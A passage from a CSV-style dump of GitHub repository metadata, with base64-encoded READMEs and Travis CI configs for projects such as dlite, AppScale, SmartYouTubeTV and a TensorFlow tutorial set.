dCBBcmNoaXRlY3R1cmVdKGh0dHBzOi8vcGlub3QucmVhZHRoZWRvY3MuaW8v
ZW4vbGF0ZXN0L2FyY2hpdGVjdHVyZS5odG1sKQotIFtQaW5vdCBRdWVyeSBM
YW5ndWFnZV0oaHR0cHM6Ly9waW5vdC5yZWFkdGhlZG9jcy5pby9lbi9sYXRl
c3QvcHFsX2V4YW1wbGVzLmh0bWwpCgojIyBMaWNlbnNlCkFwYWNoZSBQaW5v
dCBpcyB1bmRlciBbQXBhY2hlIExpY2Vuc2UsIFZlcnNpb24gMi4wXShodHRw
Oi8vd3d3LmFwYWNoZS5vcmcvbGljZW5zZXMvTElDRU5TRS0yLjApCg==
",,"bGFuZ3VhZ2U6IGphdmEKc3VkbzogZmFsc2UKZGlzdDogdHJ1c3R5CgplbnY6
CiAgZ2xvYmFsOgogICAgLSBKT0JTPTEKICBtYXRyaXg6CiAgICAtIFJVTl9J
TlRFR1JBVElPTl9URVNUUz10cnVlCiAgICAgIEtBRktBX1ZFUlNJT049MC45
CiAgICAtIFJVTl9JTlRFR1JBVElPTl9URVNUUz1mYWxzZQogICAgICBLQUZL
QV9WRVJTSU9OPTAuOQogICAgLSBSVU5fSU5URUdSQVRJT05fVEVTVFM9dHJ1
ZQogICAgICBLQUZLQV9WRVJTSU9OPTIuMAogICAgLSBSVU5fSU5URUdSQVRJ
T05fVEVTVFM9ZmFsc2UKICAgICAgS0FGS0FfVkVSU0lPTj0yLjAKCmpkazoK
ICAtIG9yYWNsZWpkazgKCmNhY2hlOgogIGRpcmVjdG9yaWVzOgogICAgLSAk
SE9NRS8ubTIKICB5YXJuOiB0cnVlCgphZGRvbnM6CiAgZmlyZWZveDogbGF0
ZXN0CgppbnN0YWxsOgogIC0gLi8udHJhdmlzX2luc3RhbGwuc2gKCnNjcmlw
dDoKICAtIC4vLnRyYXZpc190ZXN0LnNoCgpicmFuY2hlczoKICBvbmx5Ogog
ICAgLSBtYXN0ZXIK
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'dlite',40147107,b'The simplest way to use Docker on OS X',b'Go',26,2394,,2394,False,b'https://api.github.com/repos/nlf/dlite/forks',"IyBETGl0ZQoKVEhJUyBQUk9KRUNUIE5FRURTIEEgTkVXIE1BSU5UQUlORVIg
LSBJIGhhdmUgc3RvcHBlZCB1c2luZyBPU1ggYW5kIG5vIGxvbmdlciBoYXZl
IHRpbWUgdG8gY29udGludWUgdG8gd29yayBvbiB0aGlzLiBPcGVuIGFuIGlz
c3VlIGlmIHlvdSdyZSBpbnRlcmVzdGVkLgoKdGhpcyBicmFuY2ggcmVwcmVz
ZW50cyB0aGUgbGF0ZXN0ICpiZXRhKiB2ZXJzaW9uLiB0aGUgc3RhYmxlIHZl
cnNpb24gY2FuIGJlIGZvdW5kIGluIHRoZSBsZWdhY3kgYnJhbmNoLgoKIyMg
QnVpbGRpbmcKCmluc3RhbGwgZGVwZW5kZW5jaWVzCgpgYGBzaApicmV3IGlu
c3RhbGwgb3BhbSBnb2xhbmcgbGliZXYKb3BhbSBpbml0CmV2YWwgYG9wYW0g
Y29uZmlnIGVudmAKb3BhbSBpbnN0YWxsIHVyaSBxY293LjAuNy4wIGNvbmYt
bGliZXYgbG9ncyBmbXQgcWNvdy1mb3JtYXQKZ28gZ2V0IC11IGdpdGh1Yi5j
b20vanRlZXV3ZW4vZ28tYmluZGF0YS8uLi4KZ2l0IHN1Ym1vZHVsZSBpbml0
CmdpdCBzdWJtb2R1bGUgdXBkYXRlCmBgYAoKdXBkYXRlIGRlcGVuZGVuY2ll
cyAodXNlIHRoaXMgaWYgeW91J3ZlIGFscmVhZHkgYnVpbHQgdGhlIHByb2pl
Y3QgYmVmb3JlKQoKYGBgc2gKZ2l0IHN1Ym1vZHVsZSBmb3JlYWNoIGdpdCBw
dWxsIG9yaWdpbiBtYXN0ZXIKb3BhbSB1cGRhdGUKb3BhbSB1cGdyYWRlCmBg
YAoKYnVpbGQgdGhlIGJpbmFyeQoKYGBgc2gKZ28gZ2VuZXJhdGUKZ28gYnVp
bGQKYGBgCg==
",,"b3M6IG9zeApsYW5ndWFnZTogZ28Kb3N4X2ltYWdlOiB4Y29kZTgKCmJlZm9y
ZV9pbnN0YWxsOgogIC0gYnJldyB1cGRhdGUKICAtIGJyZXcgb3V0ZGF0ZWQg
Z29sYW5nIHx8IGJyZXcgdXBncmFkZSBnb2xhbmcKICAtIGJyZXcgaW5zdGFs
bCBvcGFtIGxpYmV2CiAgLSBvcGFtIGluaXQgLXkKICAtIGdvIHZlcnNpb24K
Cmluc3RhbGw6CiAgLSBldmFsIGBvcGFtIGNvbmZpZyBlbnZgCiAgLSBvcGFt
IGluc3RhbGwgLXkgdXJpIHFjb3cuMC43LjAgY29uZi1saWJldiBsb2dzIGZt
dAogIC0gZ28gZ2V0IC11IGdpdGh1Yi5jb20vanRlZXV3ZW4vZ28tYmluZGF0
YS8uLi4KCnNjcmlwdDoKICAtIGdvIGdlbmVyYXRlCiAgLSBnbyBidWlsZAog
IC0gLi9kbGl0ZSAtLXZlcnNpb24gfHwgdHJ1ZQoKbm90aWZpY2F0aW9uczoK
ICBlbWFpbDoKICAgIG9uX3N1Y2Nlc3M6IG5ldmVyCiAgICBvbl9mYWlsdXJl
OiBhbHdheXMK
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'appscale',3803067,b'AppScale is an easy-to-manage serverless platform for building and running scalable web and mobile applications on any infrastructure.',b'Python',54,2394,,2394,False,b'https://api.github.com/repos/AppScale/appscale/forks',"IyBBcHBTY2FsZQoKWyFbR2l0SHViIHZlcnNpb25dKGh0dHBzOi8vYmFkZ2Uu
ZnVyeS5pby9naC9BcHBTY2FsZSUyRmFwcHNjYWxlLnN2ZyldKGh0dHA6Ly9i
YWRnZS5mdXJ5LmlvL2doL0FwcFNjYWxlJTJGYXBwc2NhbGUpClshW0FwcFNj
YWxlIGxpY2Vuc2VdKGh0dHBzOi8vaW1nLnNoaWVsZHMuaW8vYmFkZ2UvbGlj
ZW5zZS1BcGFjaGUlMjAyLWJsdWUuc3ZnKV0oaHR0cHM6Ly9naXRodWIuY29t
L0FwcFNjYWxlL2FwcHNjYWxlL2Jsb2IvbWFzdGVyL0xJQ0VOU0UpCgpBcHBT
Y2FsZSBpcyBhbiBlYXN5LXRvLW1hbmFnZSBzZXJ2ZXJsZXNzIHBsYXRmb3Jt
IGZvciBidWlsZGluZyBhbmQgcnVubmluZyBzY2FsYWJsZSB3ZWIgYW5kIG1v
YmlsZSBhcHBsaWNhdGlvbnMgb24gYW55IGluZnJhc3RydWN0dXJlLiAKClRo
ZSBwbGF0Zm9ybSBlbmFibGVzIGRldmVsb3BlcnMgdG8gZm9jdXMgc29sZWx5
IG9uIGJ1c2luZXNzIGxvZ2ljIGluIG9yZGVyIHRvIHJhcGlkbHkgYnVpbGQg
c2NhbGFibGUgYXBwcywgY2xlYW5seSBzZXBhcmF0aW5nIGl0IGZyb20gZGVw
bG95bWVudCBhbmQgc2NhbGluZyBsb2dpYy4gSXQgYWxsb3dzIG9wZXJhdGlv
bnMgdG8gcHJvdmlkZSBhIGNvbnNpc3RlbnQsIHR1bmFibGUgZW52aXJvbm1l
bnQgdGhhdCBjYW4gc2ltcGxpZnkgcnVubmluZyBhbmQgbWFpbnRhaW5pbmcg
YXBwcyBvbiBtdWx0aXBsZSBpbmZyYXN0cnVjdHVyZXMuIFRoZSBidXNpbmVz
cyB3aWxsIGJlbmVmaXQgZnJvbSBmYXN0ZXIgdGltZS10by1tYXJrZXQsIHJl
ZHVjZWQgb3BlcmF0aW9uYWwgY29zdHMsIG1heGltaXplZCBhcHBsaWNhdGlv
biBsaWZldGltZSwgYW5kIHRoZSBmbGV4aWJpbGl0eSB0byBpbnRlZ3JhdGUg
d2l0aCBuZXcgb3IgZXhpc3RpbmcgdGVjaG5vbG9naWVzLgoKQXBwU2NhbGUg
aXMgb3BlbiBzb3VyY2UgYW5kIG1vZGVsZWQgb24gR29vZ2xlIEFwcCBFbmdp
bmUgQVBJcywgYWxsb3dpbmcgZGV2ZWxvcGVycyB0byBhdXRvbWF0aWNhbGx5
IGRlcGxveSBhbmQgc2NhbGUgdW5tb2RpZmllZCBHb29nbGUgQXBwIEVuZ2lu
ZSBhcHBsaWNhdGlvbnMgb3ZlciBwdWJsaWMgYW5kIHByaXZhdGUgY2xvdWQg
c3lzdGVtcyBhbmQgb24tcHJlbWlzZSBjbHVzdGVycy4gSXQgY3VycmVudGx5
IHN1cHBvcnRzIFB5dGhvbiwgR28sIFBIUCBhbmQgSmF2YSBhcHBsaWNhdGlv
bnMuIFRoZSBzb2Z0d2FyZSBpcyBkZXZlbG9wZWQgYW5kIG1haW50YWluZWQg
YnkgQXBwU2NhbGUgU3lzdGVtcywgSW5jLiwgYmFzZWQgaW4gU2FudGEgQmFy
YmFyYSwgQ2FsaWZvcm5pYSwgYW5kIEdvb2dsZS4KCgojIyBXaHkgVXNlIEFw
cFNjYWxlPwpUaGUgZ29hbCBvZiBBcHBTY2FsZSBpcyB0byBwcm92aWRlIGRl
dmVsb3BlcnMgd2l0aCBhIHJhcGlkLCBBUEktZHJpdmVuIGRldmVsb3BtZW50
IHBsYXRmb3JtIHRoYXQgY2FuIHJ1biBhcHBsaWNhdGlvbnMgb24gYW55IGNs
b3VkIGluZnJhc3RydWN0dXJlLiBBcHBTY2FsZSBkZWNvdXBsZXMgYXBwbGlj
YXRpb24gbG9naWMgZnJvbSBpdHMgc2VydmljZSBlY29zeXN0ZW0gdG8gZ2l2
ZSBkZXZlbG9wZXJzIGFuZCBjbG91ZCBhZG1pbmlzdHJhdG9ycyBjb250cm9s
IG92ZXIgYXBwbGljYXRpb24gZGVwbG95bWVudCwgZGF0YSBzdG9yYWdlLCBy
ZXNvdXJjZSB1c2UsIGJhY2t1cCwgYW5kIG1pZ3JhdGlvbi4KCgojIyBJIFdh
bnQgLi4uCiogdG8gW2NvbnRyaWJ1dGVdKGh0dHBzOi8vZ2l0aHViLmNvbS9B
cHBTY2FsZS9hcHBzY2FsZS93aWtpL0NvbnRyaWJ1dGUlMjEpCiogdG8gW3Ry
eSBBcHBTY2FsZV0oaHR0cHM6Ly93d3cuYXBwc2NhbGUuY29tL2dldC1zdGFy
dGVkLykKKiB0byBzZWUgW2hvdyBvdGhlciBwZW9wbGUgdXNlIEFwcFNjYWxl
XShodHRwczovL3d3dy5hcHBzY2FsZS5jb20vd2h5LWFwcHNjYWxlLykKKiBb
Y3VzdG9tZXIgc3VwcG9ydF0oaHR0cHM6Ly93d3cuYXBwc2NhbGUuY29tL3By
b2R1Y3RzL2FwcHNjYWxlLWN1c3RvbWVyLXN1Y2Nlc3MvKQoqIHRvIFtsZWFy
biBtb3JlXShodHRwczovL2dpdGh1Yi5jb20vQXBwU2NhbGUvYXBwc2NhbGUv
d2lraSkKCgojIyBEb2N1bWVudGF0aW9uCiogR2V0dGluZyBTdGFydGVkCiAg
KiBbQXBwU2NhbGUgRmFzdFN0YXJ0XShodHRwczovL3d3dy5hcHBzY2FsZS5j
b20vZ2V0LXN0YXJ0ZWQvKQogICogW0RlcGxveW1lbnQgdHlwZXNdKGh0dHBz
Oi8vd3d3LmFwcHNjYWxlLmNvbS9nZXQtc3RhcnRlZC9kZXBsb3ltZW50LXR5
cGVzLykKICAqIFtEZXBsb3kgQXBwU2NhbGVdKGh0dHBzOi8vd3d3LmFwcHNj
YWxlLmNvbS9nZXQtc3RhcnRlZC9kZXBsb3ktYXBwc2NhbGUvKQoqIFVzZXJz
CiAgKiBbTWFuYWdpbmcgQXBwcyBhbmQgQXBwU2NhbGVdKGh0dHBzOi8vd3d3
LmFwcHNjYWxlLmNvbS9nZXQtc3RhcnRlZC9tYW5hZ2VtZW50LykKICAqIFtB
dXRvbWF0ZWQgRGF0YSBQZXJzaXN0ZW5jZV0oaHR0cHM6Ly9naXRodWIuY29t
L0FwcFNjYWxlL2FwcHNjYWxlL3dpa2kvQXV0b21hdGVkLURhdGEtUGVyc2lz
dGVuY2UpCiAgKiBbTXVsdGlub2RlIERlcGxveW1lbnRzXShodHRwczovL2dp
dGh1Yi5jb20vQXBwU2NhbGUvYXBwc2NhbGUvd2lraS9EaXN0cmlidXRlZC1E
ZXBsb3ltZW50KQogICogW01ha2luZyBBcHBTY2FsZSBTY2FsZV0oaHR0cHM6
Ly9naXRodWIuY29tL0FwcFNjYWxlL2FwcHNjYWxlL3dpa2kjbWFraW5nLWFw
cHNjYWxlLXNjYWxlKQoqIERldmVsb3BlcnMKICAqIFtEYXRhc3RvcmUgVG9w
aWNzXShodHRwczovL2dpdGh1Yi5jb20vQXBwU2NhbGUvYXBwc2NhbGUvd2lr
aSNkYXRhc3RvcmUtdG9waWNzKQogICogW0FkdmFuY2VkIFRvcGljc10oaHR0
cHM6Ly9naXRodWIuY29tL0FwcFNjYWxlL2FwcHNjYWxlL3dpa2kjYWR2YW5j
ZWQtdG9waWNzKQoqIEFyY2hpdGVjdHVyZQogICogQXBwU2NhbGUncyBbY29y
ZSBjb21wb25lbnRzXShodHRwczovL2dpdGh1Yi5jb20vQXBwU2NhbGUvYXBw
c2NhbGUvd2lraSNsZWFybi1hYm91dC1hcHBzY2FsZS1jb3JlLWNvbXBvbmVu
dHMpCiogW0ZBUXNdKGh0dHBzOi8vZ2l0aHViLmNvbS9BcHBTY2FsZS9hcHBz
Y2FsZS93aWtpL0ZBUXMpIGFuZCBbVHJvdWJsZXNob290aW5nXShodHRwczov
L2dpdGh1Yi5jb20vQXBwU2NhbGUvYXBwc2NhbGUvd2lraS9Ucm91Ymxlc2hv
b3RpbmcpCgojIyBDb21tdW5pdHkgYW5kIFN1cHBvcnQKSm9pbiB0aGUgW0Nv
bW11bml0eSBHb29nbGUgR3JvdXBdKGh0dHA6Ly9ncm91cHMuZ29vZ2xlLmNv
bS9ncm91cC9hcHBzY2FsZV9jb21tdW5pdHkpIGZvciBhbm5vdW5jZW1lbnRz
LCBoZWxwLCBhbmQgdG8gZGlzY3VzcyBjbG91ZCByZXNlYXJjaC4KCkFsc28s
IGpvaW4gdXMgb24gWyNhcHBzY2FsZSBvbiBmcmVlbm9kZV0oaHR0cDovL3dl
YmNoYXQuZnJlZW5vZGUubmV0Lz9jaGFubmVscz1hcHBzY2FsZSZ1aW89ZDQp
IGlmIHlvdSBoYXZlIHF1ZXN0aW9ucywgc3VnZ2VzdGlvbnMsIGNvbW1lbnRz
LCBvciBqdXN0IHdhbnQgdG8gc2F5IGhpIQo=
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'SmartYouTubeTV',77243612,b'Watch YouTube videos on your TV and set-top-box with comfort',b'Java',117,2394,,2394,False,b'https://api.github.com/repos/yuliskov/SmartYouTubeTV/forks',"IVtMb2dvIG9mIFNtYXJ0WW91VHViZVRWXShzY3JlZW5zaG90cy9zbWFydHlv
dXR1YmV0di1sb2dvX3NtYWxsLnBuZyAiTG9nbyBvZiBTbWFydFlvdVR1YmVU
ViIpIFNtYXJ0WW91VHViZVRWCj09PT09PT09PQoKWyFbTVBMdjIgTGljZW5z
ZV0oaHR0cDovL2ltZy5zaGllbGRzLmlvL2JhZGdlL2xpY2Vuc2UtTVBMdjIt
Ymx1ZS5zdmc/c3R5bGU9ZmxhdC1zcXVhcmUpXShodHRwczovL3d3dy5tb3pp
bGxhLm9yZy9NUEwvMi4wLykKCl9fU21hcnRZb3VUdWJlVFY6IEEgWW91VHVi
ZSBjbGllbnQgZm9yIHNldC10b3AgYm94ZXMgYW5kIEFuZHJvaWQtYmFzZWQg
VFZzOl9fCgogKiA8YSBocmVmPSJodHRwczovL3QubWUvU21hcnRZb3VUdWJl
VFYiPlRlbGVncmFtIGdyb3VwPC9hPgogKiA8YSBocmVmPSJodHRwczovL3Nt
YXJ0eW91dHViZXR2LmdpdGh1Yi5pby8jY29tbWVudC0zNDMyNDg0MTI5IiB0
YXJnZXQ9Il9ibGFuayI+VmlzaXQgZGlzY3Vzc2lvbiBvbiB0aGUgb2ZmaWNp
YWwgcGFnZTwvYT4KCiMjIyBGZWF0dXJlczoKCiAqIF9fNEsgc3VwcG9ydC5f
XwogKiBEZXNpZ25lZCBmb3IgVFYgc2NyZWVucy4KICogQW55IHJlbW90ZSBj
b250cm9sbGVyIHN1cHBvcnQuCiAqIExvZ2luIHN1cHBvcnQuCiAqIERvZXNu
J3QgZGVwZW5kIG9uIEdvb2dsZSBTZXJ2aWNlcy4KICogRnVsbHkgbG9jYWxp
emVkLgogKiBNdWx0aWxpbmd1YWwgc2VhcmNoIGtleWJvYXJkLgogKiBBdXRv
bWF0aWMgdXBkYXRlIG1lY2hhbmlzbS4KICogX19ObyByb290IHJlcXVpcmVk
IV9fCgpfX05PVEU6IFNtYXJ0WW91VHViZVRWIHByb3ZpZGVzIGludGVybmFs
IGxvZ2luIG1lY2hhbmlzbSB3aGljaCBhbGxvd3MgeW91IHRvIGtlZXAgY29u
dGVudCB1cCB0byBkYXRlIGluIGEgdmVyeSBjb252ZW5pZW50IHdheS5fXwoK
IyMjIFNjcmVlbnNob3RzOgogKiBbT3BlbiBzY3JlZW5zaG90c10oI3NjcmVl
bnMpCgojIyMgSW5zdGFsbCBTbWFydFlvdVR1YmVUVjoKCl9fRWFzeSBpbnN0
YWxsYXRpb24gaW4gbGVzcyB0aGFuIDUgbWludXRlcyB3aXRoIG9ubHkgdGhl
IEZpcmVUVl9fCiAqIDxhIGhyZWY9Imh0dHBzOi8vZ2l0aHViLmNvbS95dWxp
c2tvdi9TbWFydFlvdVR1YmVUVi93aWtpL0luc3RhbGwtU21hcnRZb3VUdWJl
VFYtKG9ubHktRmlyZVRWLW5lZWRlZCkiPkluc3RhbGwgU21hcnRZb3VUdWJl
VFYgKG9ubHkgRmlyZVRWIG5lZWRlZCk8L2E+CgpfX1N0YW5kYXJkIGluc3Rh
bGxhdGlvbiB2aWEgQURCX18KICogSWYgeW91IGRvbid0IGtub3cgaG93IHRv
IHNpZGVsb2FkL2luc3RhbGwgYXBwcyB2aWEgQURCLCByZWFkIGEgdHV0b3Jp
YWwgKGUuZy4gPGEgaHJlZj0iaHR0cDovL2tvZGkud2lraS92aWV3L0hPVy1U
TzpJbnN0YWxsX0tvZGlfb25fRmlyZV9UViIgdGFyZ2V0PSJfYmxhbmsiPnRo
aXMgb25lPC9hPikKICogPGEgaHJlZj0iaHR0cHM6Ly9naXRodWIuY29tL3l1
bGlza292L1NtYXJ0WW91VHViZVRWL3JlbGVhc2VzIiB0YXJnZXQ9Il9ibGFu
ayI+RG93bmxvYWQgbGF0ZXN0IFNtYXJ0WW91VHViZVRWIEFQSzwvYT4gYW5k
IHNpZGVsb2FkL2luc3RhbGwgd2l0aCBhZGI6IAogKiAqYWRiIGluc3RhbGwg
LXIgU21hcnRZb3VUdWJlVFZfT3JpZy5hcGsqCiAqIEVuam95IDopCgpfX0hv
dyB0byBjaGFuZ2Ugc3lzdGVtIGxhbmd1YWdlIHdpdGggb25seSB0aGUgTWlU
VjNfXwogKiBbSG93LXRvLWVuYWJsZS1FbmdsaXNoLW9uLUFuZHJvaWQtNS4x
XShodHRwczovL2dpdGh1Yi5jb20veXVsaXNrb3YvU21hcnRZb3VUdWJlVFYv
d2lraS9Ib3ctdG8tZW5hYmxlLUVuZ2xpc2gtb24tQW5kcm9pZC01LjEpCgoj
IyMgU3RhcnRpbmcgc2NyZWVuOgoKVGhlIGRldmljZS9yZXNvbHV0aW9uIG9w
dGlvbnMgYXQgc3RhcnQgbGF1bmNoZXMgZGlmZmVyZW50IHBsYXlpbmcgbWV0
aG9kcyAoYXMgcGVyIGh0dHBzOi8vZ2l0aHViLmNvbS95dWxpc2tvdi9TbWFy
dFlvdVR1YmVUVi9pc3N1ZXMvMTUjaXNzdWVjb21tZW50LTM2NDgwNTk1MCkK
KiAxMDgwIE1haW4gLSBXZWJWaWV3CiogMTA4MCBBbHQgIC0gWFdhbGsKKiA0
SyBNYWluICAgLSBFeG9wbGF5ZXIgKyBXZWJWaWV3CiogNEsgQWx0ICAgIC0g
RXhvcGxheWVyICsgWFdhbGsKCkFsc28gaW1wb3J0YW50LCBpdCdzIHBvc3Np
YmxlIHRvIHNlbGVjdCBtYXggcmVzb2x1dGlvbiBhbmQgY29kZWMgKGllIDEw
ODAvQVZDMSkgdmlhIHRoZSBzdGFydCBzY3JlZW4gdGhhdCB3aWxsIGJlIGFw
cGxpZWQgb24gdmlkZW8gbG9hZGluZyAoKipDb2RlYyoqIG9wdGlvbikuCgpU
aGUgKipSZW1lbWJlcioqIHRpY2sgYm94IGFjdHMgYXMgYSBjb25maWd1cmF0
aW9uIHNhdmluZyBmb3IgbmV4dCBhcHAgbGF1bmNoZXMuCgojIyMgRG9uYXRp
b246CklmIHlvdSB3YW50IHRvIHN1cHBvcnQgbXkgZGV2ZWxvcG1lbnRzIHlv
dSBhcmUgd2VsY29tZSB0byBidXkgbWUgYSBjdXAgb2YgY29mZmVlIDopCiAq
IFtfX0RvbmF0aW9uIEFsZXJ0cyAoUlUsIFBheVBhbClfX10oaHR0cHM6Ly93
d3cuZG9uYXRpb25hbGVydHMucnUvci9maXJzdGhhc2gpCiAqIFtfX1ByaXZh
dEJhbmsgKFVBKV9fXShodHRwczovL3ByaXZhdGJhbmsudWEvcnUvc2VuZG1v
bmV5P3BheW1lbnQ9NWZjZGRkZjUzZTNkNDkxZDYzZmNiMDUwZTZlMmUwNWYy
ZjI2NzhjMikKICogX19CVENfXzogMUpBVDVWVldhclZCa3BWYk5EbjhVQThI
WE5kcnVrdUJTeAogCiMjIyBSZXZpZXdzIC8gQXJ0aWNsZXM6CiAqIFtfX09m
ZmljaWFsIHNpdGVfX10oaHR0cHM6Ly9zbWFydHlvdXR1YmV0di5naXRodWIu
aW8pCiAqIFtfX1hEQSB0aHJlYWRfX10oaHR0cHM6Ly9mb3J1bS54ZGEtZGV2
ZWxvcGVycy5jb20vZmlyZS10di90aGVtZXMtYXBwcy9tb2RpZmllZC12ZXJz
aW9uLXNtYXJ0LXlvdXR1YmUtdHYtdDM3NzMzODQpCiAKIyMjIENoYW5nZWxv
ZzoKICogW0NoZWNrIHJlbGVhc2VzIHBhZ2UgZm9yIGNoYW5nZWxvZyAuLl0o
aHR0cHM6Ly9naXRodWIuY29tL3l1bGlza292L1NtYXJ0WW91VHViZVRWL3Jl
bGVhc2VzKQoKIyMjIENvbnRyaWJ1dG9yczoKICogX19bV29sZmdhblBdKGh0
dHBzOi8vZ2l0aHViLmNvbS9Xb2xmZ2FuUClfXyAoUkVBRE1FKQogKiBfX1tq
YXZpZXJwel0oaHR0cHM6Ly9naXRodWIuY29tL2phdmllcnB6KV9fIChjYXN0
IGZpeCkKICogX19bVGhlUk1hdmVyaWNrXShodHRwczovL2dpdGh1Yi5jb20v
VGhlUk1hdmVyaWNrKV9fIChHZXJtYW4gbGFuZ3VhZ2UpCiAqIF9fW01haWtl
bGw4NF0oaHR0cHM6Ly9naXRodWIuY29tL01haWtlbGw4NClfXyAobWlzYyBm
aXhlcykKCiMjIyBTY3JlZW5zOgohW1NjcmVlbnNob3Qgb2YgU21hcnRZb3VU
dWJlVFZdKHNjcmVlbnNob3RzL3NtYXJ0eW91dHViZXR2X3NjcmVlbnNob3Rf
MDEuanBnICJTY3JlZW5zaG90IG9mIFNtYXJ0WW91VHViZVRWIikKIVtTY3Jl
ZW5zaG90IG9mIFNtYXJ0WW91VHViZVRWXShzY3JlZW5zaG90cy9zbWFydHlv
dXR1YmV0dl9zY3JlZW5zaG90XzAyLmpwZyAiU2NyZWVuc2hvdCBvZiBTbWFy
dFlvdVR1YmVUViIpCiFbU2NyZWVuc2hvdCBvZiBTbWFydFlvdVR1YmVUVl0o
c2NyZWVuc2hvdHMvc21hcnR5b3V0dWJldHZfc2NyZWVuc2hvdF8wMy5qcGcg
IlNjcmVlbnNob3Qgb2YgU21hcnRZb3VUdWJlVFYiKQohW1NjcmVlbnNob3Qg
b2YgU21hcnRZb3VUdWJlVFZdKHNjcmVlbnNob3RzL3NtYXJ0eW91dHViZXR2
X3NjcmVlbnNob3RfMDQuanBnICJTY3JlZW5zaG90IG9mIFNtYXJ0WW91VHVi
ZVRWIikKIVtTY3JlZW5zaG90IG9mIFNtYXJ0WW91VHViZVRWXShzY3JlZW5z
aG90cy9zbWFydHlvdXR1YmV0dl9zY3JlZW5zaG90XzA1LmpwZyAiU2NyZWVu
c2hvdCBvZiBTbWFydFlvdVR1YmVUViIp
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'Tensorflow-101',58386168,b'TensorFlow Tutorials',b'Jupyter Notebook',14,2393,,2393,False,b'https://api.github.com/repos/sjchoi86/Tensorflow-101/forks',"IyBUZW5zb3JmbG93IFR1dG9yaWFscyB1c2luZyBKdXB5dGVyIE5vdGVib29r
IAoKVGVuc29yRmxvdyB0dXRvcmlhbHMgd3JpdHRlbiBpbiBQeXRob24gKG9m
IGNvdXJzZSkgd2l0aCBKdXB5dGVyIE5vdGVib29rLiBUcmllZCB0byBleHBs
YWluIGFzIGtpbmRseSBhcyBwb3NzaWJsZSwgYXMgdGhlc2UgdHV0b3JpYWxz
IGFyZSBpbnRlbmRlZCBmb3IgVGVuc29yRmxvdyBiZWdpbm5lcnMuIEhvcGUg
dGhlc2UgdHV0b3JpYWxzIHRvIGJlIGEgdXNlZnVsIHJlY2lwZSBib29rIGZv
ciB5b3VyIGRlZXAgbGVhcm5pbmcgcHJvamVjdHMuIEVuam95IGNvZGluZyEg
OikgCgojIyBDb250ZW50cwoxLiBCYXNpY3Mgb2YgW1RlbnNvckZsb3ddKGh0
dHBzOi8vZ2l0aHViLmNvbS9zamNob2k4Ni90ZW5zb3JmbG93LTEwMS9ibG9i
L21hc3Rlci9ub3RlYm9va3MvYmFzaWNfdGVuc29yZmxvdy5pcHluYikgLyBb
TU5JU1RdKGh0dHBzOi8vZ2l0aHViLmNvbS9zamNob2k4Ni90ZW5zb3JmbG93
LTEwMS9ibG9iL21hc3Rlci9ub3RlYm9va3MvYmFzaWNfbW5pc3QuaXB5bmIp
IC8gW051bXB5XShodHRwczovL2dpdGh1Yi5jb20vc2pjaG9pODYvVGVuc29y
Zmxvdy0xMDEvYmxvYi9tYXN0ZXIvbm90ZWJvb2tzL2Jhc2ljX3B5dGhvbi5p
cHluYikgIC8gW0ltYWdlIFByb2Nlc3NpbmddKGh0dHBzOi8vZ2l0aHViLmNv
bS9zamNob2k4Ni90ZW5zb3JmbG93LTEwMS9ibG9iL21hc3Rlci9ub3RlYm9v
a3MvYmFzaWNfaW1ncHJvY2Vzcy5pcHluYikgLyBbR2VuZXJhdGluZyBDdXN0
b20gRGF0YXNldF0oaHR0cHM6Ly9naXRodWIuY29tL3NqY2hvaTg2L3RlbnNv
cmZsb3ctMTAxL2Jsb2IvbWFzdGVyL25vdGVib29rcy9iYXNpY19nZW5kYXRh
c2V0LmlweW5iKQoyLiBNYWNoaW5lIExlYXJpbmcgQmFzaWNzIHdpdGggVGVu
c29yRmxvdzogW0xpbmVhciBSZWdyZXNzaW9uXShodHRwczovL2dpdGh1Yi5j
b20vc2pjaG9pODYvdGVuc29yZmxvdy0xMDEvYmxvYi9tYXN0ZXIvbm90ZWJv
b2tzL2xpbmVhcl9yZWdyZXNzaW9uLmlweW5iKSAvIFtMb2dpc3RpYyBSZWdy
ZXNzaW9uIHdpdGggTU5JU1RdKGh0dHBzOi8vZ2l0aHViLmNvbS9zamNob2k4
Ni90ZW5zb3JmbG93LTEwMS9ibG9iL21hc3Rlci9ub3RlYm9va3MvbG9naXN0
aWNfcmVncmVzc2lvbl9tbmlzdC5pcHluYikgLyBbTG9naXN0aWMgUmVncmVz
c2lvbiB3aXRoIEN1c3RvbSBEYXRhc2V0XShodHRwczovL2dpdGh1Yi5jb20v
c2pjaG9pODYvdGVuc29yZmxvdy0xMDEvYmxvYi9tYXN0ZXIvbm90ZWJvb2tz
L2xvZ2lzdGljX3JlZ3Jlc3Npb25fY3VzdG9tZGF0YS5pcHluYikKMy4gTXVs
dGktTGF5ZXIgUGVyY2VwdHJvbiAoTUxQKTogW1NpbXBsZSBNTklTVF0oaHR0
